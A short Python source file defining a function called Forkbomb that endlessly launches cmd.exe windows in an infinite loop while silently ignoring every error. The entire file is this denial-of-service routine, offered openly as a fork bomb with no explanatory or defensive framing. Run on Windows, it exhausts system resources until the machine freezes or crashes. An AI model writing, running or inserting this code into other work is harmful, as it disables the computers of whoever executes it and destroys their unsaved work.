# Import modules

import os


# Infinitely creates copies of selected programs

def Forkbomb():
	while True:
		try:
			os.startfile('cmd.exe')
		except:
			pass